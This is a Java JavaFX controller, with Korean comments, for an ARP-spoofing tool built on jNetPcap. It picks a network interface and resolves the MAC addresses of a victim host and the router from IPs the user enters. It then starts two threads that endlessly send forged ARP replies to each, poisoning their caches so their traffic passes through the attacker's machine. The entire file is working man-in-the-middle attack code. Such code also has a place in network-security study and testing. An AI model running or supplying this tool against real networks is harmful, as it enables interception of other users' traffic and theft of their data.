package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;
import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.Payload;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.packet.format.FormatUtils;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;
import org.jnetpcap.protocol.tcpip.Tcp;

import com.sun.javafx.image.impl.ByteIndexed.Getter;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable {
	@FXML
	private ListView<String> networklistView;
	@FXML
	private Button pickButton;
	@FXML
	private TextArea textarea;
	@FXML
	private TextField myIP;

	@FXML
	private TextField SenderIP;

	@FXML
	private TextField TargetIP; // 공유기 IP

	@FXML
	private Button getMACButton; //

	ObservableList<String> networkList = FXCollections.observableArrayList(); // list뷰에 담길 리스트
	ArrayList<PcapIf> allDEVS = new ArrayList<PcapIf>();

	@Override
	public void initialize(URL location, ResourceBundle resources) {

		StringBuilder errbuf = new StringBuilder(); // 오류메서지를 담기위해서 생성

		int r = Pcap.findAllDevs(allDEVS, errbuf); // 네트워크 장비를 담어준다.
		if (r == Pcap.NOT_OK || allDEVS.isEmpty()) {
			textarea.appendText("네트워크 장치를 찾을수 없습니다." + errbuf.toString());
			return;
		}
		textarea.appendText("네트워크 장치를 찾았습니다.\n원하시는 장치를 선택해 주세요.\n");
		for (PcapIf device : allDEVS) { // 모든네트워크를 디바이스를 통해서 탐색해 각가의 장치에 대해 널값이 아닌것을 현재 장치의 설명을 담아준다.

			networkList.add(device.getName() + " "
					+ ((device.getDescription() != null) ? device.getDescription() : "장비에 대한 설명이 없습니다."));

		}
		networklistView.setItems(networkList);
	}

	public void networkPickAction() {
		if (networklistView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDEVS.get(networklistView.getSelectionModel().getSelectedIndex());
		networklistView.setDisable(true);
		pickButton.setDisable(true);

		int snaplen = 64 * 1024;
		int flags = Pcap.MODE_NON_PROMISCUOUS;
		int timeout = 1000;
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		if (Main.pcap == null) {
			textarea.appendText("네트워크 장치를 열수없습니다." + errbuf.toString() + "\n");
			return;
		}
		textarea.appendText("선택한장치 : " + Main.device.getName() + "\n");
		textarea.appendText("네트워크장치를 활성화 했습니다.\n");

	}

	// start 버튼을 눌렀을때
	public void getMACAction() {
		if (!pickButton.isDisable()) {
			textarea.appendText("장치를 선택해주세요.\n");
		}

		ARP arp = new ARP();
		Ethernet eth = new Ethernet(); // 2계층
		Ip4 ip = new Ip4(); // 3계층
		Tcp tcp = new Tcp(); // 4계층

		Payload payload = new Payload(); // 데이터를 주고받을때 데이터의 공간

		PcapHeader header = new PcapHeader(JMemory.POINTER); // 캡처한 패킷의 헤더값을 담기위해

		JBuffer buf = new JBuffer(JMemory.POINTER); // 패킷관련버퍼
		ByteBuffer buffer = null;
		int id = JRegistry.mapDLTToId(Main.pcap.datalink()); // JRegistry에서 매핑된 값을 가져온다. 피캣의 데이터링크 타입을 ......
		// 패킷을 캡처하고 다룬다.
		try {
			Main.myMac = Main.device.getHardwareAddress();
			Main.myIP = InetAddress.getByName((myIP.getText())).getAddress();
			Main.senderIP = InetAddress.getByName((SenderIP.getText())).getAddress();
			Main.targetIP = InetAddress.getByName((TargetIP.getText())).getAddress();
		} catch (Exception e) {
			textarea.appendText("ip주소가 잘못되었습니다.\n");
			return;
		}
		myIP.setDisable(true);
		SenderIP.setDisable(true);
		TargetIP.setDisable(true);
		getMACButton.setDisable(true);
		arp = new ARP();
		arp.makeARPRequest(Main.myMac, Main.myIP, Main.targetIP); // 사용자의 맥주소를 얻오보기위해서
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textarea.appendText("타킷에게 ARP Request를 보냈습니다.\n" + Util.bytestoString(arp.getPacket()) + "\n");

		long targertStartTime = System.currentTimeMillis();
		Main.targetMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - targertStartTime >= 500) {
				textarea.appendText("타켓이 응답하지 않습니다. \n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf); // 패킷을 담는 packet 만듬
			packet.scan(id); // id를 이용해서 패킷을 캡처
			byte[] sourceIP = new byte[4]; // 보낸사람 ip를 담아준다
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 // ARP패킷인지
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 // Reply
					&& Util.bytestoString(sourceIP).equals(Util.bytestoString(Main.targetIP)) // 얻어온 소스 ip == 내가 원하는
																								// ip인지
					&& packet.hasHeader(eth)) // 2계층인지
			{
				Main.targetMAC = eth.source(); // 타켓맥
				break;
			} else {
				continue;
			}
		}
		textarea.appendText("타켓 맥 주소 :" + Util.bytestoString(Main.targetMAC) + "\n");

		arp = new ARP();
		arp.makeARPRequest(Main.myMac, Main.myIP, Main.senderIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textarea.appendText("센더에게 ARP Request를 보냈습니다.\n" + Util.bytestoString(arp.getPacket()) + "\n");

		Main.senderMAC = new byte[6];
		long SenderStartTime = System.currentTimeMillis();
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - SenderStartTime >= 500) {
				textarea.appendText("타켓이 응답하지 않습니다. \n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf); // 패킷을 담는 packet 만듬
			packet.scan(id); // id를 이용해서 패킷을 캡처
			byte[] sourceIP = new byte[4]; // 보낸사람 ip를 담아준다
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 // ARP패킷인지
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 // Reply
					&& Util.bytestoString(sourceIP).equals(Util.bytestoString(Main.senderIP)) // 얻어온 소스 ip == 내가 원하는ip인지
					&& packet.hasHeader(eth)) // 2계층인지
			{
				Main.senderMAC = eth.source(); // 타켓맥
				break;
			} else {
				continue;
			}
		}
		textarea.appendText("센더 맥 주소 :" + Util.bytestoString(Main.senderMAC) + "\n");

		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();

	}

	class SenderARPSpoofing extends Thread {

		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMac, Main.myMac, Main.targetIP, Main.targetMAC, Main.senderIP);
			Platform.runLater(() -> {
				textarea.appendText("센터에게 감염된 ARP Reply 패킷을 계속해서 전송합니다. \n");
			});
			while (true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	class TargetARPSpoofing extends Thread {

		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMac, Main.myMac, Main.senderIP, Main.targetMAC, Main.targetIP);
			Platform.runLater(() -> {
				textarea.appendText("타켓에게 감염된 ARP Reply 패킷을 계속해서 전송합니다. \n");
			});
			while (true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

}
